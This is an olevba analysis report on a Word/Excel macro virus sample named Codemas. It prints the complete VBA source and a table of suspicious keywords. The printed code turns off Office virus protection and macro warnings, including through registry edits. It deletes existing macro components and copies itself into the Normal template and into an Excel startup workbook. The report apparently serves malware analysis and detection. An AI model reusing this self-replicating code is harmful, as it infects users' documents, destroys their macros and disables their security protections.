olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Codemas-a8cd0a2b9f18fa03e1537e5c30f10cdcad605bf8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Codemas-a8cd0a2b9f18fa03e1537e5c30f10cdcad605bf8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Dim InstMast As Boolean
InstMast = False
With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
End With
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set Code = ThisDocument.VBProject.VBComponents.Item(1)
CodeMast = Code.CodeModule.Lines(1, Code.CodeModule.CountOfLines)
If NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines) <> CodeMast Then
    If NT.CodeModule.CountOfLines > 0 Then
        NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
    End If
    Set fVict = NormalTemplate
    SaveNorm = NormalTemplate.Saved
    InstMast = True
ElseIf AD.CodeModule.Lines(1, CodeMast.CodeModule.CountOfLines) <> CodeMast Then
    If AD.CodeModule.CountOfLines > 0 Then
        AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    End If
    Set fVict = ActiveDocument
    SaveDoc = ActiveDocument.Saved
    InstMast = True
End If
For i = 1 To fVict.VBProject.VBComponents.Count
    If (fVict.VBProject.VBComponents(i).Type <> 100) Then
        Application.OrganizerDelete fVict.FullName, fVict.VBProject.VBComponents(i).Name, wdOrganizerObjectProjectItems
    End If
Next i
DisVirProt
Set xl = CreateObject("Excel.Application")
If UCase(Dir(xl.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
    Set Mastxl = xl.Workbooks.Add
    Mastxl.VBProject.VBComponents("ThisWorkbook").CodeModule.AddFromString CodeMast
    Mastxl.SaveAs FileName:=xl.Application.StartupPath + "\Book1."
End If
xl.Quit
Set Vict = fVict.VBProject.VBComponents.Item(1)
If InstMast = True Then
    Vict.CodeModule.AddFromString CodeMast
    If SaveNorm = True Then NormalTemplate.Save
    If SaveDoc = True Then ActiveDocument.Save
End If
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Set Vict = ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule
Set Code = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule
CodeMast = Code.Lines(1, Code.CountOfLines)
If UCase(Dir(Application.StartupPath & "\Book1.")) <> "BOOK1" Then
    Set xlApp = CreateObject("Excel.Application")
    Set BookMast = xlApp.Workbooks.Add
    BookMast.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, CodeMast.Lines(1, CodeMast.CountOfLines)
    BookMast.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
    xlApp.Quit
End If
    For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
        If ActiveWorkbook.VBProject.VBComponents(i).CodeModule.Find("'Code", 1, 1, 1000, 1000) = False Then
            ActiveWorkbook.VBProject.VBComponents(i).CodeModule.DeleteLines 1, ActiveWorkbook.VBProject.VBComponents(i).CodeModule.CountOfLines
        Addi = ActiveWorkbook.VBProject.VBComponents(i).Name
        If ActiveWorkbook.VBProject.VBComponents(i).Type = 100 Then
            If UCase(Mid((ActiveWorkbook.VBProject.VBComponents(i).Name), 1, 5)) <> "SHEET" Then
                ActiveWorkbook.VBProject.VBComponents(i).CodeModule.InsertLines 1, CodeMast
                If Mid((ActiveWorkbook.Name), 1, 4) <> "Book" Then
                    If ActiveWorkbook.Saved = False Then ActiveWorkbook.Save
                End If
            End If
        End If
        End If
    Next i
Set wd = GetObject(, "Word.Application")
If wd = " " Then
   Set wd = CreateObject("Word.Application")
   wdq = True
End If
For i = 1 To wd.NormalTemplate.VBProject.VBComponents.Count
    Set wdNT = wd.NormalTemplate.VBProject.VBComponents(i)
    If wdNT.Type <> 100 Then
        wd.Application.OrganizerDelete wd.NormalTemplate.FullName, wd.NormalTemplate.VBProject.VBComponents(i).Name, wd.wdOrganizerObjectProjectItems
    ElseIf wdNT.Type = 100 And wdNT.CodeModule.Lines(1, wdNT.CodeModule.CountOfLines) <> CodeMast Then
        wdNT.CodeModule.DeleteLines 1, wdNT.CodeModule.CountOfLines
        wd.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString CodeMast
    End If
Next i
wd.Run "Normal." + wd.NormalTemplate.VBProject.VBComponents.Item(1) + ".DisVirProt"
Set wd = Nothing
If wdq = True Then wd.Quit
End Sub
Private Sub DisVirProt()
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Option6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Option6") = ""
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Option6") = ""
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

